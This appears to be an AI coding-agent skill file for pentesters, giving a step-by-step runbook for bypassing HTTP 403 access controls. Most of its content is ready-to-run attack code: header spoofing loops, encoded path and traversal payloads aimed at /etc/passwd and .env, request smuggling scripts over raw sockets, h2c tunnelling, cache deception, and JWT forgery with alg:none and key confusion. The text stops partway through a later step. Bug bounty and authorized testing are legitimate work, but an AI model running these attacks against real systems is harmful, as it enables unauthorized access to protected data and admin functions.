---
name: 403-bypass
description: Use when encountering HTTP 403 Forbidden responses during pentests or bug bounty hunting, testing access control bypasses, trying to reach restricted endpoints, admin panels, or protected API routes. Also trigger when the user says "403 bypass", "bypass forbidden", "access denied bypass", "forbidden page bypass", or "trying to access restricted endpoint". Use this whenever a 403 needs to be tested - not just blindly accepted.
---

# 403 Bypass

## Overview

A 403 doesn't always mean truly inaccessible. Misconfigured reverse proxies, CDNs, WAFs, and backend servers enforce access controls at different layers - creating parser-level gaps. This skill covers every known bypass class, from basic header tricks to conference-grade research techniques (DEF CON 2024, Black Hat 2024/2025, Orange Tsai's parser logic work, PortSwigger cache research).

**Goal:** Confirm whether a 403 is a hard block or a bypass-able misconfiguration, then document evidence for reporting.

---

## Phase 0: Smart Intake

```bash
source ~/.claude/skills/_shared/phase0.sh
source ~/.claude/skills/_shared/signals.sh

p0_init_vars "$1"
p0_state_gate "HARVEST" || exit 0
p0_read_relay recon
p0_read_memory
p0_read_hypotheses

TECH_STACK=$KNOWN_TECH  # alias for downstream references

echo "=== PHASE 0 403-BYPASS INTAKE: $TARGET ==="
echo "State: $STATE | WAF: $WAF"
echo "Tech stack: $TECH_STACK"
echo "Target endpoints for bypass: $(echo "$INTERESTING_ENDPOINTS" | wc -l)"
echo "Top hypothesis: $TOP_HYPO_LABEL [$TOP_HYPO_PROB%]"
echo "ATW flagged (avoid): ${ATW_FLAGGED:-none}"
```

### Execution Manifest

Build targeted manifest: one item per bypass technique class per target endpoint. Priority is determined by WAF type detected.

```bash
# WAF-to-priority mapping:
# Cloudflare  -> c02 (header), c05 (double-encode), c12 (automated), c17b (origin IP direct hit)
# Akamai      -> c10 (smuggling OPTIONS+line-folding CVE-2025-32094), c11 (cache deception), c02
# AWS WAF     -> c17 (ALB direct), c02 (header), c04 (path manipulation)
# Nginx+Apache-> c07 (path confusion CVE-2025-0108), c08 (off-by-slash), c15 (mod_proxy CVE-2024-38473)
# IIS         -> c18 (tilde enum + ADS), c22b (Apache ? bypass if applicable)
# unknown     -> c02, c04, c09, c12 (automated sweep)

MANIFEST=$(cat << 'MANIFEST_EOF'
{
  "phase": "403-bypass",
  "generated_at": "YYYY-MM-DD HH:MM",
  "items": [
    {"id":"b01","tool":"baseline","target":"<403-endpoint>","reason":"fingerprint WAF/CDN/server before trying anything","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"b02","tool":"header-bypass","target":"<403-endpoint>","reason":"X-Forwarded-For/X-Original-URL IP spoofing","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"b03","tool":"path-manipulation","target":"<403-endpoint>","reason":"encoding/case/extension tricks bypass string-match ACL","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"b04","tool":"hop-by-hop-strip","target":"<403-endpoint>","reason":"strip auth headers via Connection: header","priority":"SHOULD","status":"pending","skip_reason":null},
    {"id":"b05","tool":"double-url-encoding","target":"<403-endpoint>","reason":"WAF decodes once, backend decodes twice (DEF CON 2024)","priority":"SHOULD","status":"pending","skip_reason":null},
    {"id":"b06","tool":"method-fuzzing","target":"<403-endpoint>","reason":"ACL may only block GET, not PUT/POST/TRACE","priority":"SHOULD","status":"pending","skip_reason":null},
    {"id":"b07","tool":"nomore403","target":"<403-endpoint>","reason":"330+ automated bypass techniques","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"b08","tool":"waf-specific-bypass","target":"<403-endpoint>","reason":"targeted technique for detected WAF type","priority":"MUST","status":"pending","skip_reason":"skip if WAF=unknown"},
    {"id":"b09","tool":"h2c-smuggling","target":"<403-endpoint>","reason":"h2c upgrade causes proxy to stop inspecting requests","priority":"IF_TIME","status":"pending","skip_reason":null},
    {"id":"b10","tool":"prototype-pollution","target":"<403-endpoint>","reason":"Node.js/Express auth bypass via __proto__","priority":"IF_TIME","status":"pending","skip_reason":"skip if no Node.js in tech stack"}
  ]
}
MANIFEST_EOF
)

jq --argjson m "$MANIFEST" '.scalpel.active_manifest = $m' $SESSION > /tmp/s.json && mv /tmp/s.json $SESSION
```

**Manifest adjustment rules (apply before starting):**
- WAF=Cloudflare AND Zafran BreakingWAF worth testing: add b11 for origin IP direct bypass
- WAF=Akamai: promote b09 to MUST (CVE-2025-32094 Akamai-specific)
- WAF=Nginx+Apache in chain: promote path confusion (Step 7) to b04 MUST
- IIS detected: add b12 for tilde+ADS bypass as MUST
- No Node.js in tech stack: mark b10 as skipped
- If `STATE=DEEP`: keep only b01, b02, b07, b08 as MUST; mark others IF_TIME

---

## Step 1: Baseline the 403

Fingerprint what's enforcing the block before trying anything:

```bash
# Baseline - note response size, headers, timing
curl -ski "https://target.com/restricted" -o /dev/null -w "HTTP: %{http_code} | Size: %{size_download} | Time: %{time_total}s\n"

# Fingerprint WAF/CDN/proxy from response headers
curl -sI "https://target.com/restricted" | grep -i "server\|x-powered\|cf-ray\|x-cache\|via\|x-amz\|akamai\|x-varnish\|x-kong\|x-envoy"

# Check if Nginx/Apache in chain - affects which path confusion attacks work
curl -sI "https://target.com/" | grep -i "server"
```

Record: response code, body size, WAF/CDN headers, backend server type. This guides which bypass class to prioritize.

---

## Step 2: Header-Based Bypasses

Reverse proxies trust certain headers to indicate internal/privileged origin. The backend often applies different ACL rules for "internal" traffic.

```bash
TARGET="https://target.com/restricted"

# IP spoofing - trick backend into thinking request is from localhost/internal
for HEADER in \
  "X-Forwarded-For: 127.0.0.1" \
  "X-Forwarded-For: 127.0.0.1, 127.0.0.1" \
  "X-Real-IP: 127.0.0.1" \
  "X-Originating-IP: 127.0.0.1" \
  "X-Remote-IP: 127.0.0.1" \
  "X-Remote-Addr: 127.0.0.1" \
  "X-Custom-IP-Authorization: 127.0.0.1" \
  "X-Forwarded-For: 10.0.0.1" \
  "X-Forwarded-For: 192.168.1.1" \
  "X-ProxyUser-Ip: 127.0.0.1" \
  "True-Client-IP: 127.0.0.1" \
  "Client-IP: 127.0.0.1" \
  "X-Host: localhost" \
  "X-Forwarded-Host: localhost" \
  "X-Forwarded-Host: 127.0.0.1" \
  "Forwarded: for=127.0.0.1"
do
  CODE=$(curl -sk -H "$HEADER" "$TARGET" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | $HEADER" || echo "[ ] $CODE | $HEADER"
done

# URL rewrite headers - proxy rewrites path, backend sees different route
for HEADER in \
  "X-Original-URL: /admin" \
  "X-Rewrite-URL: /admin" \
  "X-Override-URL: /admin"
do
  CODE=$(curl -sk -H "$HEADER" "https://target.com/" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | root + $HEADER" || echo "[ ] $CODE | root + $HEADER"
done

# Referer + User-Agent spoofing
curl -sk -H "Referer: https://target.com/admin" "$TARGET" -o /dev/null -w "%{http_code} | Referer spoof\n"
# Googlebot bypass - some WAFs whitelist crawlers
curl -sk -A "Googlebot/2.1 (+http://www.google.com/bot.html)" "$TARGET" -o /dev/null -w "%{http_code} | Googlebot UA\n"
```

---

## Step 3: Hop-by-Hop Header Stripping (Research-Grade)

**Source:** Nathan Davison's research + Fabio proxy CVE (2025)

Hop-by-hop headers (defined in `Connection:`) get stripped by HTTP/1.1 proxies before forwarding. If the proxy adds auth/security headers AND you can force it to strip them, the backend never sees authentication:

```bash
TARGET="https://target.com/restricted"

# Force proxy to strip auth-critical headers it normally adds
# The proxy adds X-Forwarded-For / Authorization, then strips them because you listed them in Connection
curl -sk "$TARGET" \
  -H "Connection: X-Forwarded-For, Cookie, Authorization" \
  -o /dev/null -w "%{http_code} | hop-by-hop strip auth headers\n"

# Strip specific headers the proxy adds for access control decisions
for STRIP_HEADER in \
  "X-Authenticated-User" \
  "X-Auth-Token" \
  "X-User-Role" \
  "X-Internal" \
  "Authorization"
do
  CODE=$(curl -sk "$TARGET" -H "Connection: $STRIP_HEADER" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | stripping $STRIP_HEADER via Connection" || echo "[ ] $CODE | stripping $STRIP_HEADER"
done

# Fabio proxy pattern: strip X-Forwarded headers to break backend trust assumptions
curl -sk "$TARGET" \
  -H "Connection: X-Forwarded-Host, X-Forwarded-For" \
  -o /dev/null -w "%{http_code} | Fabio pattern\n"
```

**Why this works:** The proxy's auth check sets a header like `X-Auth-Check: passed`, then forwards to backend. If you declare that header hop-by-hop, the proxy strips it - backend sees no auth check header and may default to allow.

---

## Step 4: Path/URL Manipulation

Middleware and WAF ACL rules match on exact path strings. Encoding, casing, adding segments, or using alternative path separators can slip past the rule while the backend still resolves the same resource.

```bash
BASE="https://target.com"
SEG="restricted"   # replace with actual path segment (e.g., admin, api/v1/users)

PAYLOADS=(
  "/$SEG/"
  "/$SEG/."
  "/$SEG/.."
  "//$SEG"
  "/$SEG//"
  "/./$SEG"
  "/$SEG%20"
  "/$SEG%09"
  "/$SEG%00"
  "/$SEG?"
  "/$SEG#"
  "/$SEG..;/"
  "/$SEG;/"
  "/$SEG;foo"
  "/%2f$SEG"
  "/$SEG%2f"
  "/$SEG%252f"         # double-encoded slash
  "/$(echo $SEG | tr '[:lower:]' '[:upper:]')"
  "/$SEG.json"
  "/$SEG.html"
  "/$SEG.php"
  "/$SEG~"
  "/api/v1/../$SEG"
  "/$SEG%0d"           # CR injection
  "/$SEG%0a"           # LF injection
  "/$SEG\t"
)

for P in "${PAYLOADS[@]}"; do
  CODE=$(curl -sk "$BASE$P" -o /dev/null -w "%{http_code}")
  SIZE=$(curl -sk "$BASE$P" -o /tmp/403resp -w "%{size_download}" && cat /tmp/403resp | wc -c)
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | $BASE$P" || echo "[ ] $CODE | $BASE$P"
done
```

---

## Step 5: Double URL Encoding (DEF CON 2024)

**Source:** Justin Rhynorater Gardner's DEF CON 2024 Bug Bounty Village talk - incorporated into nomore403.

WAFs decode once to check the path, but the backend decodes again. Double-encoded payloads bypass the WAF's string match:

```bash
TARGET_BASE="https://target.com"
SEG="restricted"

# %252f = double-encoded forward slash (first decode: %2f, second decode: /)
# %2e%2e = double-encoded .. (first decode: .., second decode: ..)
DOUBLE_ENCODED=(
  "/%252f$SEG"
  "/$SEG%252f"
  "/%252e%252e%252f$SEG"
  "/%2e%2e%2f$SEG"
  "/%252e%252e/$SEG"
  "/%25%32%66$SEG"        # triple encoding of /
  "/..%252f$SEG"
  "/$SEG%252e"
)

for P in "${DOUBLE_ENCODED[@]}"; do
  CODE=$(curl -sk --path-as-is "$TARGET_BASE$P" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | $TARGET_BASE$P" || echo "[ ] $CODE | $TARGET_BASE$P"
done
```

**Key flag:** Always use `--path-as-is` with curl so it doesn't normalize the encoded path before sending.

---

## Step 6: Unicode Normalization Bypass

**Source:** CVE-2024-43093 (Android), real-world bug bounty writeups 2024-2025.

WAFs and ACL rules do string matching on the raw path. If the backend normalizes Unicode (NFC/NFD) before routing, a Unicode lookalike character bypasses the string match while resolving to the same resource:

```bash
TARGET="https://target.com"

# Unicode lookalikes for common path segments
# Cyrillic а (U+0430) looks identical to Latin a
# Use when WAF blocks exact string /admin but backend normalizes Unicode

# Test with curl directly - paste Unicode chars or use \u escaping via Python
python3 -c "
import requests

payloads = [
    '/\u0430dmin',          # Cyrillic a
    '/adm\u0456n',          # Cyrillic i
    '/\u0251dmin',          # Latin alpha
    '/admin\u200b',         # zero-width space
    '/\uff01admin',         # full-width !
    '/\u2215admin',         # division slash (looks like /)
    '/\u29f8admin',         # big solidus
]

for p in payloads:
    try:
        r = requests.get(f'https://target.com{p}', verify=False, timeout=5)
        status = r.status_code
        if status != 403:
            print(f'[!] HIT: {status} | {p}')
        else:
            print(f'[ ] {status} | {p}')
    except Exception as e:
        print(f'[ERR] {p}: {e}')
"
```

---

## Step 7: Nginx/Apache Path Confusion (CVE-2025-0108 Pattern)

**Source:** Assetnote research, February 2025. Directly exploited in PAN-OS to bypass authentication.

When Nginx and Apache sit in chain, they normalize paths differently. Nginx checks the URI and sets an auth header, Apache re-normalizes and routes differently - the auth header is already set to "off":

```bash
TARGET="https://target.com"
PROTECTED_PATH="restricted/admin.php"

# Pattern: /unauth/%2e%2e/protected_path
# Nginx sees: /unauth/../protected_path - matches unauth rule, sets AuthCheck=off
# Apache sees: /protected_path after normalization - serves it without auth

CONFUSION_PAYLOADS=(
  "/unauth/%2e%2e/$PROTECTED_PATH"
  "/public/..%2f$PROTECTED_PATH"
  "/static/../$PROTECTED_PATH"
  "/assets/..%2f..%2f$PROTECTED_PATH"
  "/%2e%2e/$PROTECTED_PATH"
  "/allowed_path/../$PROTECTED_PATH"
)

for P in "${CONFUSION_PAYLOADS[@]}"; do
  CODE=$(curl -sk --path-as-is "$TARGET$P" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | $TARGET$P" || echo "[ ] $CODE | $TARGET$P"
done

# Also test with PATH_INFO confusion (mod_php quirk)
# Apache sets SCRIPT_FILENAME to matched .php file, PATH_INFO to rest
curl -sk --path-as-is "$TARGET/allowed.php/$PROTECTED_PATH" -o /dev/null -w "%{http_code} | PATH_INFO confusion\n"
```

---

## Step 8: Nginx Off-By-Slash Alias Bypass

**Source:** Orange Tsai, Black Hat USA 2018 "Breaking Parser Logic" - still widely unpatched.

When nginx `alias` directive is missing a trailing slash, path traversal is possible through the alias boundary:

```bash
# Detect: if /assets is aliased to /var/www/static/ (note: location lacks trailing slash)
# /assets../etc/passwd traverses out of the alias directory
# Applied to 403 bypass: if /admin is protected by alias misconfiguration

TARGET="https://target.com"
ALIAS_PATHS=("assets" "static" "media" "files" "uploads" "public" "cdn" "img")
PROTECTED=("../admin/config" "../etc/passwd" "../.env" "../config.php" "../admin")

for ALIAS in "${ALIAS_PATHS[@]}"; do
  for PROT in "${PROTECTED[@]}"; do
    URL="$TARGET/$ALIAS$PROT"
    CODE=$(curl -sk "$URL" -o /dev/null -w "%{http_code}")
    [[ "$CODE" != "403" && "$CODE" != "404" ]] && echo "[!] HIT: $CODE | $URL" || echo "[ ] $CODE | $URL"
  done
done
```

---

## Step 9: HTTP Method Fuzzing

Some backends implement access control only on GET but allow other verbs through:

```bash
TARGET="https://target.com/restricted"

for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT PROPFIND MKCOL; do
  CODE=$(curl -sk -X "$METHOD" "$TARGET" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | $METHOD" || echo "[ ] $CODE | $METHOD"
done

# Method override headers (backend trusts these, front-end doesn't check them)
for OVERRIDE in "X-HTTP-Method-Override: GET" "X-Method-Override: GET" "X-HTTP-Method: GET"; do
  CODE=$(curl -sk -X POST -H "$OVERRIDE" "$TARGET" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | POST + $OVERRIDE" || echo "[ ] $CODE | POST + $OVERRIDE"
done

# HTTP/1.0 downgrade - some WAFs only inspect HTTP/1.1+
curl -sk --http1.0 "$TARGET" -o /dev/null -w "%{http_code} | HTTP/1.0 downgrade\n"
```

**New (2025):** JSON body path traversal - WAFs inspect URL paths but rarely inspect JSON body parameters for path sequences. If the endpoint accepts a JSON path field, inject traversal payloads directly in the body:

```bash
TARGET="https://target.com/api/file"

# WAF won't catch ../../../ inside JSON body - backend processes it directly
for PAYLOAD in \
  '{"path":"../../../etc/passwd"}' \
  '{"file":"../../../../admin/config.php"}' \
  '{"filename":"../config/../admin/users.json"}' \
  '{"resource":"..%2F..%2Fetc%2Fpasswd"}' \
  '{"path":"....//....//etc/passwd"}'
do
  CODE=$(curl -sk -X POST "$TARGET" -H "Content-Type: application/json" -d "$PAYLOAD" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" && "$CODE" != "404" ]] && echo "[!] HIT: $CODE | $PAYLOAD" || echo "[ ] $CODE | $PAYLOAD"
done

# Also test multipart form and query param paths for WAF coverage gaps
curl -sk -X POST "$TARGET" \
  -F "path=../../../../etc/passwd" \
  -w "%{http_code} | multipart path traversal\n"
```

---

## Step 10: HTTP Request Smuggling for 403 Bypass

**Source:** PortSwigger Research, Black Hat/DEF CON 2024-2025. CVE-2024-6827 (Gunicorn), CVE-2025-32094 (Akamai OPTIONS/obsolete line folding).

When front-end and back-end servers parse Content-Length / Transfer-Encoding differently, you can smuggle a request that bypasses front-end ACLs:

```bash
# CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
# This smuggles a GET /admin request past the front-end
curl -sk -X POST "https://target.com/" \
  -H "Content-Length: 44" \
  -H "Transfer-Encoding: chunked" \
  -H "Connection: keep-alive" \
  --data $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' \
  -w "%{http_code}\n"

# Use smuggler.py or HTTP Request Smuggler Burp extension for systematic testing
# Also test chunk extension smuggling (2025 technique)
# Kestrel/nginx parse chunk extensions differently - LF vs CRLF
```

**CVE-2025-32094: Akamai Ghost Platform - OPTIONS + Obsolete Line Folding** (James Kettle, Black Hat 2025)

Obsolete HTTP line folding (RFC 7230 deprecated feature where a header value continues on the next line with a leading space/tab) causes two in-path Akamai servers to interpret the same request differently - enabling a hidden second request to be smuggled in the body. Test any Akamai-fronted target:

```bash
# Probe: send OPTIONS with Expect: 100-continue using obsolete line folding
# Obsolete folding: header value continues on next line with leading whitespace
# If two servers in path interpret differently = desync = smuggling possible

python3 -c "
import socket, ssl

payload = (
    'OPTIONS /restricted HTTP/1.1\r\n'
    'Host: target.com\r\n'
    'Expect: 100-continue\r\n'
    'Transfer-Encoding: chunked\r\n'
    ' ,identity\r\n'           # <-- obsolete line folding: continues Transfer-Encoding value
    'Content-Length: 40\r\n'
    '\r\n'
    '0\r\n'
    '\r\n'
    'GET /admin HTTP/1.1\r\n'  # smuggled request
    'Host: target.com\r\n'
    '\r\n'
)

ctx = ssl.create_default_context()
with socket.create_connection(('target.com', 443)) as sock:
    with ctx.wrap_socket(sock, server_hostname='target.com') as ssock:
        ssock.sendall(payload.encode())
        resp = ssock.recv(4096)
        print(resp.decode('utf-8', errors='replace'))
"

# For systematic testing, use Turbo Intruder or HTTP Request Smuggler (Burp) with the OPTIONS vector
```

For systematic smuggling, use [PortSwigger HTTP Request Smuggler extension](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) in Burp or smuggler.py.

---

## Step 11: Web Cache Deception for 403 Bypass

**Source:** PortSwigger "Gotta Cache 'em All", Black Hat USA 2024.

If a CDN/cache sits in front of the 403-protected endpoint, parser discrepancies between cache and origin can be exploited:

```bash
# Cache sees /admin.css (cacheable static extension) and caches the response
# Origin sees /admin (the protected endpoint) and returns it
# Next request for /admin.css returns cached admin content to anyone

curl -sk "https://target.com/restricted.css" -o /dev/null -w "%{http_code} | cache deception .css\n"
curl -sk "https://target.com/restricted.js" -o /dev/null -w "%{http_code} | cache deception .js\n"
curl -sk "https://target.com/restricted/style.css" -o /dev/null -w "%{http_code} | cache deception path suffix\n"

# Also test delimiter confusion - cache and origin split URLs at different characters
curl -sk "https://target.com/restricted;style.css" -o /dev/null -w "%{http_code} | delimiter confusion ;\n"
curl -sk "https://target.com/restricted?/style.css" -o /dev/null -w "%{http_code} | delimiter confusion ?\n"
```

---

## Step 12: Automated Tool Sweep

```bash
TARGET="https://target.com/restricted"

# nomore403 - Go tool, 330+ techniques, includes hop-by-hop, double URL encoding (DEF CON 2024), IP spoofing
# https://github.com/devploit/nomore403
if command -v nomore403 &>/dev/null; then
  nomore403 -u "$TARGET" --unique --verbose
fi

# 403-Bypasser - Python, native HTTP/2, Wayback Machine mining, 330+ techniques
# https://github.com/benanasutay/403-Bypasser
if command -v 403-Bypasser &>/dev/null; then
  python3 403-Bypasser.py -u "$TARGET"
fi

# gobypass403 - Go, preserves exact URL structure during fuzzing
# https://github.com/slicingmelon/gobypass403
if command -v gobypass403 &>/dev/null; then
  gobypass403 -u "$TARGET"
fi

# 4-ZERO-3 - comprehensive Python tool
if python3 4-ZERO-3.py --help &>/dev/null 2>&1; then
  python3 4-ZERO-3.py -u "$TARGET" --threads 25
fi

# ffuf header fuzzing - fuzz which header causes a bypass
if command -v ffuf &>/dev/null; then
  ffuf -u "$TARGET" \
    -H "FUZZ: 127.0.0.1" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200,201,204,301,302 -t 50 -o /tmp/ffuf_403_headers.json
fi

# Wayback Machine - check if endpoint was previously accessible/indexed
# Sometimes historical cached versions reveal content or confirm bypass potential
curl -sk "https://web.archive.org/cdx/search/cdx?url=target.com/restricted&output=json&limit=5" | python3 -m json.tool
```

---

---

## Step 13: H2C Smuggling - Protocol Upgrade 403 Bypass

**Source:** BishopFox research + Assetnote "H2C Smuggling in the Wild". Confirmed bypass against Azure Application Gateway, Cloudflare Access, and many reverse proxy setups.

When a proxy forwards an `Upgrade: h2c` request to a backend that supports HTTP/2 cleartext, the proxy stops content-inspecting the tunnel - WAF rules, path ACLs, and auth headers are no longer enforced because the proxy thinks it's just forwarding raw TCP:

```bash
# Step 1: Check if target backend supports h2c upgrade
curl -sk "https://target.com/" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAAQAAP__" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  -o /dev/null -w "%{http_code} | h2c probe\n"
# 101 Switching Protocols = vulnerable

# Step 2: Use h2csmuggler to access the protected endpoint via the tunnel
# https://github.com/BishopFox/h2csmuggler
h2csmuggler --scan-list urls.txt -x https://target.com/restricted

# Targeted attack on specific admin endpoint
h2csmuggler -x https://target.com/ https://target.com/admin
h2csmuggler -x https://target.com/ https://target.com/api/internal/users

# If h2csmuggler not available, use Python directly
python3 -c "
import h2.connection, h2.config, h2.events
import socket, ssl

# Manual h2c upgrade to access protected route
# See: https://github.com/BishopFox/h2csmuggler
"

# Assetnote variant - scan for h2c-capable proxies at scale
# https://github.com/assetnote/h2csmuggler
```

**Why this works:** Once the proxy upgrades to h2c, it stops inspecting individual HTTP requests inside the tunnel. An attacker-controlled h2c stream can now request ANY path - including 403-protected admin endpoints - and the proxy forwards them blindly.

**Confirmed victims:** Azure Application Gateway, Cloudflare Access, Traefik, Nginx with certain configurations.

---

## Step 14: Application-Layer Attacks

### 14a: JWT Algorithm Confusion (CVE-2024-54150 class)

If you have a valid JWT from a low-priv context and the endpoint uses JWT for auth:

```bash
# Decode existing JWT (no verification)
echo "YOUR_JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# alg:none bypass - strip signature, change alg to none
python3 -c "
import base64, json

header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'admin', 'role': 'admin', 'exp': 9999999999}

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
token = f'{b64(header)}.{b64(payload)}.'
print('none alg token:', token)
"

# RS256 -> HS256 confusion: if you have the server's public key, sign as HMAC
# The server verifies HMAC(data, public_key) instead of RSA verify(data, public_key, sig)
python3 -c "
import jwt, base64
pubkey = open('server_public_key.pem').read()
payload = {'sub': 'admin', 'role': 'admin'}
token = jwt.encode(payload, pubkey, algorithm='HS256')
print('HS256 confusion token:', token)
"

# Test the forged token
curl -sk "https://target.com/admin/users" \
  -H "Authorization: Bearer FORGED_TOKEN" \
  -o /tmp/jwt_resp.txt -w "%{http_code}\n" && cat /tmp/jwt_resp.txt

# CVE-2026-34950: fast-jwt whitespace-prefix RSA key algorithm confusion (CVSS 9.1)
# The publicKeyPemMatcher regex uses ^ anchor - leading whitespace defeats it.
# Result: library misclassifies RSA public key as HMAC secret -> same RS256->HS256 attack
# Works even on patched systems if key has ANY leading whitespace
python3 -c "
import jwt, re

# Get public key (often exposed at /.well-known/jwks.json or /api/auth/keys)
import urllib.request
import json

# Fetch public key from JWKS endpoint
try:
    resp = urllib.request.urlopen('https://target.com/.well-known/jwks.json')
    jwks = json.loads(resp.read())
    print('[*] JWKS found:', json.dumps(jwks, indent=2)[:200])
except:
    print('[*] Try /api/auth/keys, /oauth/keys, /.well-known/openid-configuration')

# Once you have the PEM public key:
pubkey_pem = open('server_public.pem').read()

# Whitespace variant: prepend space before -----BEGIN to trigger CVE-2026-34950
# Many fast-jwt deployments 6.1.0 and earlier are vulnerable
whitespace_key = ' ' + pubkey_pem  # leading space defeats ^ anchor in regex

payload = {'sub': 'admin', 'role': 'admin', 'iat': 1700000000, 'exp': 9999999999}
try:
    token = jwt.encode(payload, whitespace_key, algorithm='HS256')
    print('[!] CVE-2026-34950 token:', token)
except Exception as e:
    print(f'[-] Error: {e}')
    # Fallback: try with pubkey directly (non-whitespace variant)
    token = jwt.encode(payload, pubkey_pem, algorithm='HS256')
    print('[*] Standard HS256 confusion token:', token)
"


### 14b: GraphQL Introspection + Resolver 403 Bypass

GraphQL 403 blocks often only block the GET /graphql endpoint - the POST body isn't inspected:

```bash
TARGET="https://target.com/graphql"

# Introspection via POST (even if GET /graphql returns 403)
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' \
  -o /tmp/gql_schema.json -w "%{http_code}\n"

# Bypass introspection block via newline (regex doesn't handle \n)
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d $'{"query":"{ __schema\n{ types { name } } }"}' \
  -w "%{http_code} | newline introspection bypass\n"

# Bypass via special char after __schema keyword
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema\u0000{ types { name } } }"}' \
  -w "%{http_code} | null byte introspection bypass\n"

# Mutation aliasing - execute many ops in one request to bypass rate limiting
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a: sensitiveField b: sensitiveField c: sensitiveField }"}' \
  -w "%{http_code} | alias bypass\n"

# Batch query attack - array of queries in one request
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ adminData }"},{"query":"{ adminData }"}]' \
  -w "%{http_code} | batch bypass\n"
```

### 14c: HTTP Parameter Pollution

WAFs check each param separately; backend concatenates - the combined value bypasses the check but executes:

```bash
TARGET="https://target.com/api/admin"

# ASP.NET concatenates: ?role=guest&role=admin -> role=guest,admin (backend sees admin)
curl -sk "$TARGET?role=guest&role=admin" -w "%{http_code} | HPP role escalation\n"

# PHP last-wins: ?admin=false&admin=true
curl -sk "$TARGET?admin=false&admin=true" -w "%{http_code} | HPP PHP last-wins\n"

# Ruby ignores second param: ?access=restricted&access=allowed
curl -sk "$TARGET?access=restricted&access=allowed" -w "%{http_code} | HPP Ruby first-wins\n"

# JSON body pollution
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}' \
  -w "%{http_code} | JSON key duplicate\n"

# Array injection - role=["user","admin"] - backend may accept any
curl -sk -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"role":["user","admin"]}' \
  -w "%{http_code} | JSON array role\n"
```

### 14d: Content-Type Switching

Some authorization middleware only validates when Content-Type is application/json. Switching type can skip the auth check:

```bash
TARGET="https://target.com/api/admin/action"

# Try different Content-Types - auth middleware may not fire on all
for CT in \
  "application/x-www-form-urlencoded" \
  "application/xml" \
  "text/xml" \
  "text/plain" \
  "multipart/form-data" \
  "application/octet-stream" \
  "application/graphql"
do
  CODE=$(curl -sk -X POST "$TARGET" -H "Content-Type: $CT" -d "test=1" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" ]] && echo "[!] HIT: $CODE | Content-Type: $CT" || echo "[ ] $CODE | $CT"
done
```

---

## Step 15: Apache CVE-2024-38473 - mod_proxy Encoding Bypass

**Source:** Orange Tsai (DEVCORE), Apache HTTP Server 2.4.59 and earlier. CVSS 8.1.

Apache mod_proxy incorrectly handles URL-encoded paths when proxying - the encoding is passed through to the backend without proper normalization, allowing ACL bypass:

```bash
TARGET="https://target.com"
RESTRICTED="admin"

# mod_proxy passes encoded path to backend without normalizing
# Apache ACL rule blocks /admin but passes /%61dmin (a = %61)
ENCODED_PAYLOADS=(
  "/%61dmin"           # a = %61
  "/adm%69n"           # i = %69
  "/admi%6e"           # n = %6e
  "/%61%64%6d%69%6e"  # full encoding of "admin"
  "/admin%2fconfig"    # encoded slash
  "/%2e%2e/admin"      # encoded traversal
)

for P in "${ENCODED_PAYLOADS[@]}"; do
  CODE=$(curl -sk --path-as-is "$TARGET$P" -o /dev/null -w "%{http_code}")
  [[ "$CODE" != "403" && "$CODE" != "404" ]] && echo "[!] HIT: $CODE | $TARGET$P" || echo "[ ] $CODE | $TARGET$P"
done

# Nuclei template for automated detection
nuclei -u "$TARGET" -t CVE-2024-38473.yaml 2>/dev/null || \
  nuclei -u "$TARGET" -tags apache -severity high,critical
```

**Affected:** Apache 2.4.59 and earlier using mod_proxy. Fixed in 2.4.60.

### Step 15b: Apache Confusion Attacks - `?` ACL Bypass (Orange Tsai, Black Hat USA 2024)

**Source:** Orange Tsai (DEVCORE) "Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server" - 20 exploitation techniques, 9 CVEs, presented Black Hat 2024.

**The `?` bypass:** Apache's auth module and mod_proxy interpret `r->filename` differently. Appending `?` to a protected path causes the auth module to skip the check (it sees a different resource) while the backend still serves the protected content. All auth/ACL based on `<Files>` directives for PHP files running with PHP-FPM are at risk:

```bash
TARGET="https://target.com"
PROTECTED="admin.php"

# The killer technique - append ? to bypass Files-directive ACL
# Auth module: sees "admin.php?" (different file = no ACL match)
# Backend: ignores query string in filename = serves admin.php
curl -sk "$TARGET/$PROTECTED?" -o /tmp/qbp.txt -w "%{http_code} | question mark ACL bypass\n"
